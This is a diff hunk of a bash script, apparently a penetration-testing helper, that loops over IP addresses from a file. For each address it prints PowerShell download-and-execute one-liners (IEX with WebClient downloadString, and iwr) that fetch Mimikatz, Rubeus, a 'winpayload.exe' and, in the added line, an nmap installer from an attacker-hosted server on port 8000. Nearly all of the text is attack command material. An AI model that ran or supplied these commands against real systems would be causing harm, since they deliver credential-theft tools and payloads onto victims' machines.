@@ -73,6 +73,7 @@ while read line
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz32.exe')\"" 
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz32.exe')\"" 
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/rubeus.exe')\""
+    echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/nmap-setup.exe')\""
   echo "powershell \"iwr -Uri http://$line:8000/winpayload.exe -outfile winpayload.exe\""
 done < $filename
 echo ""
